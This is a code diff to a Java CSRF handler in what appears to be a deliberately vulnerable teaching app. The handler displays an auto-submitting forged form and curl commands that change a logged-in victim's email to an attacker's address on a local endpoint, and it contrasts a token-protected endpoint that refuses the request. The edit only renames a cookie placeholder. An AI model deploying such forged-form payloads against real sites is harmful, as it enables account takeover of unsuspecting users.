@@ -144,10 +144,10 @@ public class CsrfHandler implements IRouteHandler {
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"Forged form post", "<form action=\"http://localhost:8090/csrf/vulnerable\" method=\"POST\"><input name=\"email\" value=\"" + ATTACKER_EMAIL + "\"></form><script>document.forms[0].submit()</script>",
              "Hosted on any site. Auto-submits as soon as a logged-in victim opens it.", null,
-             "curl -s -X POST http://localhost:8090/csrf/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'email=" + ATTACKER_EMAIL + "'"},
+             "curl -s -X POST http://localhost:8090/csrf/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'email=" + ATTACKER_EMAIL + "'"},
             {"Same request, no token", "POST /csrf/mitigated  email=" + ATTACKER_EMAIL,
              "The forged request has the cookie but not the token. The server answers 403.", null,
-             "curl -s -X POST http://localhost:8090/csrf/mitigated -b 'JSESSIONID=SESSION' --data-urlencode 'email=" + ATTACKER_EMAIL + "'"},
+             "curl -s -X POST http://localhost:8090/csrf/mitigated -b 'SESSION_COOKIE=SESSION' --data-urlencode 'email=" + ATTACKER_EMAIL + "'"},
         });
 
         String content = TemplateEngine.vulnerabilityBadge(Messages.get("csrf.badge.id"), Messages.get("csrf.badge.name"), Messages.get("csrf.badge.tag"))
